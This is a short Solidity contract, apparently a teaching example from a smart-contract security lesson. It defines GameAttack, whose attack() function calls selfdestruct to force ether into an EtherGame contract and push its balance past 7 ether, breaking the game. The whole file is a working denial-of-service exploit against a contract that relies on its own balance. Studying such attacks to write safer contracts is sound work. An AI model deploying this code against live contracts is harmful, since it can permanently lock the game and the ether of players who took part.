// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./EtherGame.sol";

contract GameAttack {
  EtherGame etherGame;

  constructor(EtherGame _etherGame) {
    etherGame = EtherGame(_etherGame);
  }

  function attack() public payable {
    // You can simply break the game by sending ether so that
    // the game balance >= 7 ether

    // cast address to payable
    address payable addr = payable(address(etherGame));
    selfdestruct(addr);
  }
}
